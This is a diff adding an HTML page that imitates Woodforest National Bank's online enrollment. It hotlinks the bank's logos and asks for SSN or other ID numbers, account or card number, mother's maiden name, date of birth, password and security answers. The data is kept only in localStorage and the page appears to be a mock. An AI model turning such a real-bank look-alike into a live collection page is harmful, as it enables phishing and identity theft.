@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Online Services Enrollment - Woodforest National Bank</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+    <style>
+        :root {
+            --theme-green: #AED581;
+            --theme-green2: #559e3c;
+            --theme-blue: #133B65;
+            --theme-header-footer-bg: #212529;
+            --theme-body-color: #222;
+        }
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Roboto', sans-serif;
+            color: var(--theme-body-color);
+            margin: 0;
+            padding: 0;
+            background: #f4f4f4;
+        }
+
+        /* ===== HEADER ===== */
+        .site-header {
+            background-color: #fff;
+            padding: 8px 0;
+            border-bottom: 1px solid #ddd;
+        }
+        .site-header .container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            justify-content: space-between;
+        }
+        .site-header .logo img {
+            height: 40px;
+            width: auto;
+            filter: brightness(0);
+        }
+        .site-header .fdic-img {
+            height: 28px;
+            width: auto;
+        }
+        .site-header .header-links {
+            display: flex;
+            gap: 1.25rem;
+            align-items: center;
+        }
+        .site-header .header-links a {
+            color: #444;
+            text-decoration: none;
+            font-size: 0.85rem;
+            font-weight: 400;
+        }
+        .site-header .header-links a:hover {
+            color: var(--theme-green2);
+        }
+
+        /* ===== NAV BAR ===== */
+        .nav-bar {
+            background: #fff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 8px 0;
+        }
+        .nav-bar .container {
+            display: flex;
+            gap: 1.25rem;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .nav-bar a {
+            color: #333;
+            text-decoration: none;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+        .nav-bar a:hover {
+            color: var(--theme-green2);
+        }
+
+        /* ===== ENROLLMENT HEADER (steps) ===== */
+        .enroll-header {
+            background: #fff;
+            padding: 1.5rem 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .enroll-header h1 {
+            font-size: 1.35rem;
+            font-weight: 700;
+            color: var(--theme-blue);
+            margin-bottom: 1rem;
+        }
+        .step-list {
+            display: flex;
+            gap: 0;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            flex-wrap: wrap;
+        }
+        .step-list li {
+            position: relative;
+            padding: 0.35rem 0;
+            font-size: 0.82rem;
+            font-weight: 500;
+            color: #999;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .step-list li::after {
+            content: "";
+            display: inline-block;
+            width: 12px;
+            height: 1px;
+            background: #ccc;
+            margin: 0 8px;
+        }
+        .step-list li:last-child::after {
+            display: none;
+        }
+        .step-list li.active {
+            color: var(--theme-blue);
+            font-weight: 700;
+        }
+        .step-list li.completed {
+            color: var(--theme-green2);
+        }
+        .step-list .step-num {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #ddd;
+            color: #666;
+            font-size: 0.75rem;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+        .step-list li.active .step-num {
+            background: var(--theme-blue);
+            color: white;
+        }
+        .step-list li.completed .step-num {
+            background: var(--theme-green2);
+            color: white;
+        }
+
+        /* ===== ENROLLMENT FORM (card) ===== */
+        .enroll-wrapper {
+            padding: 2rem 1rem;
+        }
+        .enroll-card {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 2rem 2.5rem;
+            max-width: 680px;
+            margin: 0 auto;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        .enroll-card .step-title {
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: var(--theme-blue);
+            margin-bottom: 1.25rem;
+            padding-bottom: 0.75rem;
+            border-bottom: 2px solid var(--theme-green);
+        }
+        .enroll-card .form-row {
+            margin-bottom: 1rem;
+        }
+        .enroll-card label {
+            display: block;
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 0.3rem;
+        }
+        .enroll-card input[type="text"],
+        .enroll-card input[type="password"],
+        .enroll-card input[type="email"],
+        .enroll-card input[type="date"],
+        .enroll-card select {
+            width: 100%;
+            padding: 9px 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 0.95rem;
+            font-family: inherit;
+        }
+        /* Password visibility toggle */
+        .password-field {
+            position: relative;
+        }
+        .password-field .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #888;
+            font-size: 1.05rem;
+            padding: 0;
+            line-height: 1;
+            outline: none;
+            transition: color 0.15s;
+        }
+        .password-field .toggle-password:hover {
+            color: #444;
+        }
+        .password-field .toggle-password:focus {
+            color: var(--theme-blue);
+        }
+        .enroll-card input:focus,
+        .enroll-card select:focus {
+            outline: none;
+            border-color: var(--theme-blue);
+            box-shadow: 0 0 0 1px var(--theme-blue);
+        }
+        .enroll-card .form-hint {
+            font-size: 0.82rem;
+            color: #777;
+            margin-top: 0.2rem;
+        }
+        .enroll-card .form-group-inline {
+            display: flex;
+            gap: 1rem;
+        }
+        .enroll-card .form-group-inline > div {
+            flex: 1;
+        }
+        .enroll-card .radio-group {
+            margin: 0.5rem 0 1rem;
+        }
+        .enroll-card .radio-group label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 400;
+            cursor: pointer;
+            padding: 6px 0;
+            margin-bottom: 0;
+        }
+        .enroll-card .radio-group input[type="radio"] {
+            margin: 0;
+            width: auto;
+        }
+        .enroll-card .btn-row {
+            display: flex;
+            gap: 0.75rem;
+            margin-top: 1.25rem;
+            padding-top: 1rem;
+            border-top: 1px solid #e0e0e0;
+            justify-content: center;
+            align-items: center;
+        }
+        .enroll-card .btn-next {
+            background-color: var(--theme-green);
+            color: var(--theme-header-footer-bg);
+            border: none;
+            padding: 10px 36px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            min-width: 120px;
+            text-align: center;
+        }
+        .enroll-card .btn-next:hover {
+            background-color: var(--theme-green2);
+            color: white;
+        }
+        .enroll-card .btn-cancel {
+            background-color: transparent;
+            color: #666;
+            border: 1px solid #ccc;
+            padding: 10px 24px;
+            font-size: 0.95rem;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            text-align: center;
+        }
+        .enroll-card .btn-cancel:hover {
+            background-color: #f5f5f5;
+        }
+        .btn-send-token {
+            background-color: var(--theme-green);
+            color: var(--theme-header-footer-bg);
+            border: none;
+            padding: 9px 18px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .btn-send-token:hover {
+            background-color: var(--theme-green2);
+            color: white;
+        }
+
+        /* Clear all data button */
+        .clear-data-btn {
+            background-color: #e74c3c;
+            color: white;
+            border: none;
+            padding: 6px 14px;
+            font-size: 0.78rem;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 0.5rem;
+        }
+        .clear-data-btn:hover {
+            background-color: #c0392b;
+        }
+
+        /* Warning icon */
+        .form-warning {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.82rem;
+            color: #888;
+            margin-bottom: 1rem;
+        }
+        .form-warning img {
+            height: 18px;
+            width: auto;
+        }
+
+        /* Help section */
+        .help-section {
+            margin-top: 2rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #e0e0e0;
+        }
+        .help-section h3 {
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--theme-blue);
+            margin-bottom: 1rem;
+        }
+        .help-item {
+            display: flex;
+            gap: 0.75rem;
+            align-items: flex-start;
+            margin-bottom: 0.75rem;
+        }
+        .help-item img {
+            height: 24px;
+            width: auto;
+            flex-shrink: 0;
+        }
+        .help-item a {
+            color: var(--theme-blue);
+            text-decoration: underline;
+            font-size: 0.9rem;
+        }
+        .help-item a:hover {
+            color: var(--theme-green2);
+        }
+
+        /* ===== FOOTER ===== */
+        .site-footer {
+            background-color: #f8f8f8;
+            border-top: 1px solid #e0e0e0;
+            padding: 1.25rem 0;
+            text-align: center;
+            font-size: 0.82rem;
+            color: #666;
+        }
+        .site-footer a {
+            color: var(--theme-blue);
+            text-decoration: underline;
+        }
+        .site-footer a:hover {
+            color: var(--theme-green2);
+        }
+        .site-footer .eoe-img {
+            height: 20px;
+            width: auto;
+            vertical-align: middle;
+            margin-left: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="site-header">
+        <div class="container-lg px-sm-4 px-lg-0">
+            <div class="d-flex align-items-center justify-content-between flex-wrap gap-2">
+                <div class="d-flex align-items-center gap-2">
+                    <a href="/"><img src="https://www.woodforest.com/media/xijhunfv/wnb-logo-light.png" alt="Woodforest National Bank" style="height:38px; filter:brightness(0);" /></a>
+                    <img src="https://www.woodforest.com/images/fdic-light.png" alt="FDIC" style="height:28px; width:auto;" />
+                </div>
+                <div class="header-links">
+                    <a href="/about-us/contact-us/locations/">Locations</a>
+                    <a href="/about-us/contact-us/">Contact Us</a>
+                    <a href="/about-us/privacy-security/">Privacy</a>
+                    <a href="/es/personal/banca-en-linea-y-movil/">En Espa&#241;ol</a>
+                    <a href="#">Help</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- NAV BAR -->
+    <nav class="nav-bar">
+        <div class="container-lg px-sm-4 px-lg-0">
+            <div class="d-flex gap-3 flex-wrap">
+                <a href="/personal/">Personal</a>
+                <a href="/small-business/">Small Business</a>
+                <a href="/commercial/">Commercial</a>
+                <a href="/woodforest-cares/">Woodforest Cares</a>
+                <a href="/about-us/">About Us</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- ENROLLMENT STEPS HEADER -->
+    <div class="enroll-header">
+        <div class="container-lg px-sm-4 px-lg-0">
+            <h1>Online Services Enrollment</h1>
+            <ul class="step-list">
+                <li class="active"><span class="step-num">1</span> Verify Identity</li>
+                <li><span class="step-num">2</span> Service Agreement</li>
+                <li><span class="step-num">3</span> Optional Services</li>
+                <li><span class="step-num">4</span> Setup User Profile</li>
+                <li><span class="step-num">5</span> Setup Security Profile</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ENROLLMENT FORM -->
+    <div class="enroll-wrapper">
+        <div class="enroll-card">
+
+            <!-- STEP 1: Verify Identity -->
+            <div class="enroll-step" id="step-1">
+                <h2 class="step-title">1. Verify Identity</h2>
+                <div class="form-row">
+                    <label for="id-type">Identification Type:</label>
+                    <select id="id-type" name="id_type">
+                        <option value="">-- Select a type --</option>
+                        <option value="ssn">Social Security Number</option>
+                        <option value="dl">Driver's License</option>
+                        <option value="state_id">State Identification Card</option>
+                        <option value="matricula">Matricula Card</option>
+                        <option value="military">Military Identification</option>
+                        <option value="passport">Passport</option>
+                    </select>
+                </div>
+                <div class="form-row">
+                    <label for="id-number">Identification Number:</label>
+                    <input type="text" id="id-number" name="id_number" placeholder="Enter your identification number" />
+                </div>
+                <div class="form-row">
+                    <label>Verify Yourself With:</label>
+                    <div class="form-warning">
+                        <i class="bi bi-exclamation-triangle" style="color:#e67e22; font-size:1.1rem;"></i>
+                        <span>Please select one of the following: a Woodforest account or debit card number, or a "Welcome" token</span>
+                    </div>
+                    <div class="radio-group">
+                        <label>
+                            <input type="radio" name="verify_with" value="account" checked id="verify-account" />
+                            A Woodforest account or debit card number
+                        </label>
+                        <label>
+                            <input type="radio" name="verify_with" value="token" id="verify-token" />
+                            A "Welcome" token
+                        </label>
+                    </div>
+                </div>
+                <div id="account-fields">
+                    <div class="form-row">
+                        <label for="account">Account:</label>
+                        <input type="text" id="account" name="account" placeholder="Checking, Savings or Debit Card Number" />
+                    </div>
+                    <div class="form-row">
+                        <label for="maiden-name">Mother's Maiden Name:</label>
+                        <input type="text" id="maiden-name" name="maiden_name" placeholder="" />
+                    </div>
+                    <div class="form-row">
+                        <label for="dob">Date of Birth:</label>
+                        <input type="text" id="dob" name="dob" placeholder="Format: mm/dd/yyyy" />
+                    </div>
+                </div>
+                <div id="token-fields" style="display:none;">
+                    <div class="form-row">
+                        <label for="token">Welcome Token:</label>
+                        <div style="display:flex; gap:8px;">
+                            <input type="text" id="token" name="token" placeholder="Enter your welcome token" style="flex:1;" />
+                            <button type="button" id="sendTokenBtn" class="btn-send-token">Send</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 2: Service Agreement -->
+            <div class="enroll-step" id="step-2" style="display:none;">
+                <h2 class="step-title">2. Service Agreement</h2>
+                <div style="border:1px solid #e0e0e0; border-radius:4px; padding:1rem; margin-bottom:1rem; max-height:300px; overflow-y:auto; background:#fafafa; font-size:0.85rem; color:#444; line-height:1.6;">
+                    <strong>WOODFOREST NATIONAL BANK ONLINE SERVICES AGREEMENT</strong><br><br>
+                    <strong>1. Agreement.</strong> This Online Services Agreement ("Agreement") governs your use of the online banking services provided by Woodforest National Bank ("Bank"). By using the online services, you agree to the terms of this Agreement.<br><br>
+                    <strong>2. Eligibility.</strong> You must be at least 18 years old and a resident of the United States to enroll. By enrolling, you represent that you are the primary account holder.<br><br>
+                    <strong>3. Account Security.</strong> You are responsible for all activities conducted under your online banking account. You agree to keep your username, password, and security questions confidential.<br><br>
+                    <strong>4. Fees.</strong> Standard account fees and transaction fees apply to your online banking services. Review your account disclosures for a complete list of fees.<br><br>
+                    <strong>5. Electronic Communications.</strong> By enrolling, you agree to receive account statements, notifications, and other communications electronically.<br><br>
+                    <strong>6. Privacy.</strong> Your personal information will be collected, used, and shared in accordance with our <a href="/about-us/privacy-security/">Privacy Policy</a>.<br><br>
+                    <strong>7. Termination.</strong> The Bank may suspend or terminate your online banking access at any time with or without notice.<br><br>
+                    <strong>8. Limitation of Liability.</strong> The Bank shall not be liable for indirect, incidental, or consequential damages arising from your use of the online services.<br><br>
+                    <strong>9. Modifications.</strong> The Bank reserves the right to modify this Agreement at any time. Continued use of the services constitutes acceptance of any modifications.<br><br>
+                    <em>Effective Date: January 1, 2026. Questions? Call 1-877-968-7962.</em>
+                </div>
+                <div class="radio-group">
+                    <label>
+                        <input type="radio" name="agree_terms" value="accept" />
+                        I ACCEPT the terms and conditions of this agreement
+                    </label>
+                    <label>
+                        <input type="radio" name="agree_terms" value="decline" />
+                        I DECLINE
+                    </label>
+                </div>
+            </div>
+
+            <!-- STEP 3: Optional Services -->
+            <div class="enroll-step" id="step-3" style="display:none;">
+                <h2 class="step-title">3. Optional Services</h2>
+                <p style="font-size:0.92rem; color:#444; margin-bottom:1rem;">You may enroll in the following optional services. Select all that apply.</p>
+                <div class="radio-group">
+                    <label style="margin-bottom:1rem; border-bottom:1px solid #eee; padding-bottom:1rem;">
+                        <input type="radio" name="enroll_estatement" value="yes" />
+                        <strong style="color:var(--theme-blue);">Yes, I'd like to enroll in eStatements.</strong><br>
+                        <span style="font-size:0.85rem; color:#666;">Receive your statements electronically. You will receive an email notification when your eStatement is available.</span>
+                    </label>
+                    <label>
+                        <input type="radio" name="enroll_estatement" value="no" />
+                        <strong style="color:var(--theme-blue);">No, thank you.</strong><br>
+                        <span style="font-size:0.85rem; color:#666;">You will continue to receive paper statements. A paper statement fee may apply.</span>
+                    </label>
+                </div>
+                <div style="margin-top:1rem; padding:0.75rem; background:#f8f9fa; border-radius:4px; font-size:0.85rem; color:#444; line-height:1.5;">
+                    <input type="checkbox" id="verify-pdf" name="verify_pdf" />
+                    <label for="verify-pdf" style="display:inline; font-weight:400; margin-left:6px;">I verify that I can view PDF documents and I consent to the terms above.</label>
+                </div>
+            </div>
+
+            <!-- STEP 4: Setup User Profile -->
+            <div class="enroll-step" id="step-4" style="display:none;">
+                <h2 class="step-title">4. Setup User Profile</h2>
+                <div class="form-row">
+                    <label for="email">Email Address:</label>
+                    <input type="email" id="email" name="email" placeholder="Enter your primary email address" />
+                </div>
+                <div class="form-row">
+                    <label for="email-confirm">Confirm Email Address:</label>
+                    <input type="email" id="email-confirm" name="email_confirm" placeholder="Re-enter your email address" />
+                </div>
+                <p style="font-size:0.78rem; color:#777; margin-bottom:1rem;">A verification email will be sent to this email address. You must verify your email to receive certain types of alerts.</p>
+                <div class="form-row">
+                    <label for="username">Username:</label>
+                    <input type="text" id="username" name="username" placeholder="Enter a unique username (minimum 4 characters)" />
+                </div>
+                <p style="font-size:0.78rem; color:#777; margin-bottom:1rem;">Your username must be more than three (3) characters and is not case-sensitive.</p>
+                <div class="form-row">
+                    <label for="password">Password:</label>
+                    <div class="password-field">
+                        <input type="password" id="password" name="password" placeholder="Enter your password" />
+                        <button type="button" class="toggle-password" aria-label="Show password"><i class="bi bi-eye"></i></button>
+                    </div>
+                </div>
+                <p style="font-size:0.78rem; color:#777; margin-bottom:1rem;">Passwords must be a minimum of eight (8) characters, include upper and lowercase letters, and include numbers and/or special symbols.</p>
+                <div class="form-row">
+                    <label for="password-confirm">Confirm Password:</label>
+                    <div class="password-field">
+                        <input type="password" id="password-confirm" name="password_confirm" placeholder="Re-enter your password" />
+                        <button type="button" class="toggle-password" aria-label="Show password"><i class="bi bi-eye"></i></button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 5: Setup Security Profile -->
+            <div class="enroll-step" id="step-5" style="display:none;">
+                <h2 class="step-title">5. Setup Security Profile</h2>
+                <p style="font-size:0.92rem; color:#444; margin-bottom:1rem;">Select a question and provide an answer for each of the following four security questions. Choose questions and answers that are easy for you to remember. Do not use the same answer for every question.</p>
+                <div id="security-questions">
+                    <div class="form-row">
+                        <label>Security Question 1:</label>
+                        <select>
+                            <option value="">-- Select a question --</option>
+                            <option>What is the name of your favorite pet?</option>
+                            <option>What is your mother's maiden name?</option>
+                            <option>What city were you born in?</option>
+                            <option>What was the name of your first school?</option>
+                            <option>What is your favorite color?</option>
+                        </select>
+                    </div>
+                    <div class="form-row">
+                        <label>Answer:</label>
+                        <input type="text" placeholder="Enter your answer" />
+                    </div>
+                </div>
+                <div class="form-row">
+                    <label>Security Question 2:</label>
+                    <select>
+                        <option value="">-- Select a question --</option>
+                        <option>What is the name of your favorite pet?</option>
+                        <option>What is your mother's maiden name?</option>
+                        <option>What city were you born in?</option>
+                        <option>What was the name of your first school?</option>
+                        <option>What is your favorite color?</option>
+                    </select>
+                </div>
+                <div class="form-row">
+                    <label>Answer:</label>
+                    <input type="text" placeholder="Enter your answer" />
+                </div>
+                <div class="form-row">
+                    <label>Security Question 3:</label>
+                    <select>
+                        <option value="">-- Select a question --</option>
+                        <option>What is the name of your favorite pet?</option>
+                        <option>What is your mother's maiden name?</option>
+                        <option>What city were you born in?</option>
+                        <option>What was the name of your first school?</option>
+                        <option>What is your favorite color?</option>
+                    </select>
+                </div>
+                <div class="form-row">
+                    <label>Answer:</label>
+                    <input type="text" placeholder="Enter your answer" />
+                </div>
+                <div class="form-row">
+                    <label>Security Question 4:</label>
+                    <select>
+                        <option value="">-- Select a question --</option>
+                        <option>What is the name of your favorite pet?</option>
+                        <option>What is your mother's maiden name?</option>
+                        <option>What city were you born in?</option>
+                        <option>What was the name of your first school?</option>
+                        <option>What is your favorite color?</option>
+                    </select>
+                </div>
+                <div class="form-row">
+                    <label>Answer:</label>
+                    <input type="text" placeholder="Enter your answer" />
+                </div>
+            </div>
+
+            <!-- NAVIGATION BUTTONS (always at bottom) -->
+            <div class="btn-row">
+                <button type="button" id="btn-prev" class="btn-cancel" style="display:none;">BACK</button>
+                <button type="button" id="btn-next" class="btn-next">CONTINUE</button>
+                <button type="button" id="btn-cancel" class="btn-cancel">CANCEL</button>
+            </div>
+            <div style="text-align:center; margin-top:0.75rem; border-top:1px solid #e0e0e0; padding-top:0.75rem;">
+                <button type="button" id="btn-clear-data" class="clear-data-btn"><i class="bi bi-trash3"></i> Clear All My Data</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="site-footer">
+        <div class="container-lg px-sm-4 px-lg-0">
+            <div>
+                &#169; 2026 Woodforest National Bank &nbsp;
+                <img src="https://www.woodforest.com/images/fdic-light.png" alt="FDIC" style="height:16px; vertical-align:middle;" />
+                &nbsp;&#124; Equal Housing Lender
+                <img src="https://www.woodforest.com/images/eoe_logo.gif" alt="Equal Housing Lender" class="eoe-img" />
+            </div>
+            <div class="mt-1">
+                <a href="#">Mobile Web Site</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        var currentStep = 1;
+        var totalSteps = 5;
+        var STORAGE_KEY = 'woodforest_enrollment_data';
+
+        function showStep(step) {
+            document.querySelectorAll('.enroll-step').forEach(function(el) {
+                el.style.display = 'none';
+            });
+            document.getElementById('step-' + step).style.display = '';
+            document.querySelectorAll('.step-list li').forEach(function(li, i) {
+                li.classList.remove('active', 'completed');
+                if (i + 1 < step) {
+                    li.classList.add('completed');
+                } else if (i + 1 === step) {
+                    li.classList.add('active');
+                }
+            });
+            var prevBtn = document.getElementById('btn-prev');
+            if (prevBtn) prevBtn.style.display = (step > 1) ? '' : 'none';
+            var nextBtn = document.getElementById('btn-next');
+            if (nextBtn) nextBtn.textContent = (step === totalSteps) ? 'COMPLETE' : 'CONTINUE';
+            if (step === 1) {
+                var rv = document.querySelector('input[name="verify_with"]:checked');
+                if (rv) {
+                    if (rv.value === 'account') {
+                        document.getElementById('account-fields').style.display = '';
+                        document.getElementById('token-fields').style.display = 'none';
+                    } else {
+                        document.getElementById('account-fields').style.display = 'none';
+                        document.getElementById('token-fields').style.display = '';
+                    }
+                }
+            }
+        }
+
+        function saveFormData() {
+            var data = {};
+            var container = document.getElementById('step-' + currentStep);
+            if (!container) return;
+            container.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], input[type="date"]').forEach(function(inp) {
+                data[inp.id] = inp.value;
+            });
+            container.querySelectorAll('select').forEach(function(sel) {
+                data[sel.id || sel.name] = sel.value;
+            });
+            container.querySelectorAll('input[type="radio"]').forEach(function(rad) {
+                if (rad.checked) data[rad.name] = rad.value;
+            });
+            container.querySelectorAll('input[type="checkbox"]').forEach(function(cb) {
+                data[cb.id] = cb.checked;
+            });
+            if (Object.keys(data).length > 0) {
+                var allData = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
+                allData[currentStep] = data;
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(allData));
+            }
+        }
+
+        function restoreAllData() {
+            var allData = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
+            Object.keys(allData).forEach(function(step) {
+                var data = allData[step];
+                Object.keys(data).forEach(function(id) {
+                    var el = document.getElementById(id);
+                    if (!el) return;
+                    if (el.type === 'radio') {
+                        var radios = document.querySelectorAll('input[name="' + el.name + '"]');
+                        radios.forEach(function(r) { if (r.value === String(data[id])) r.checked = true; });
+                    } else if (el.type === 'checkbox') {
+                        el.checked = !!data[id];
+                    } else {
+                        el.value = data[id];
+                    }
+                });
+            });
+        }
+
+        function goToStep(step) {
+            saveFormData();
+            currentStep = step;
+            showStep(currentStep);
+            restoreAllData();
+        }
+
+        document.getElementById('btn-next').addEventListener('click', function() {
+            if (currentStep < totalSteps) {
+                goToStep(currentStep + 1);
+            } else {
+                alert('Enrollment complete! Your account is now active.');
+            }
+        });
+
+        document.getElementById('btn-prev').addEventListener('click', function() {
+            if (currentStep > 1) {
+                goToStep(currentStep - 1);
+            }
+        });
+
+        document.getElementById('btn-cancel').addEventListener('click', function() {
+            if (confirm('Are you sure you want to cancel enrollment?')) {
+                window.location.href = '/woodforest-banking-login.html';
+            }
+        });
+
+        document.getElementById('btn-clear-data').addEventListener('click', function() {
+            if (confirm('Clear all your entered data? This cannot be undone.')) {
+                localStorage.removeItem(STORAGE_KEY);
+                document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], input[type="date"]').forEach(function(el) { el.value = ''; });
+                document.querySelectorAll('select').forEach(function(el) { el.selectedIndex = 0; });
+                document.querySelectorAll('input[type="checkbox"]').forEach(function(el) { el.checked = false; });
+                document.querySelectorAll('input[type="radio"]').forEach(function(el) { el.checked = false; });
+                alert('All data has been cleared.');
+            }
+        });
+
+        document.querySelectorAll('input[name="verify_with"]').forEach(function(radio) {
+            radio.addEventListener('change', function() {
+                if (this.value === 'account') {
+                    document.getElementById('account-fields').style.display = '';
+                    document.getElementById('token-fields').style.display = 'none';
+                } else {
+                    document.getElementById('account-fields').style.display = 'none';
+                    document.getElementById('token-fields').style.display = '';
+                }
+            });
+        });
+
+        document.getElementById('sendTokenBtn').addEventListener('click', function() {
+            var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var token = '';
+            for (var i = 0; i < 12; i++) {
+                token += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            var formatted = token.replace(/(.{4})/g, '$1-').replace(/-$/, '');
+            document.getElementById('token').value = formatted;
+        });
+
+        document.addEventListener('DOMContentLoaded', function() {
+            restoreAllData();
+            showStep(1);
+        });
+
+        // Password visibility toggle on all password fields
+        document.querySelectorAll('.toggle-password').forEach(function(btn) {
+            btn.addEventListener('click', function() {
+                var wrapper = this.closest('.password-field');
+                if (!wrapper) return;
+                var input = wrapper.querySelector('input[type="password"], input[type="text"]');
+                if (!input) return;
+                var icon = this.querySelector('i');
+                if (input.type === 'password') {
+                    input.type = 'text';
+                    icon.className = 'bi bi-eye-slash';
+                    this.setAttribute('aria-label', 'Hide password');
+                } else {
+                    input.type = 'password';
+                    icon.className = 'bi bi-eye';
+                    this.setAttribute('aria-label', 'Show password');
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
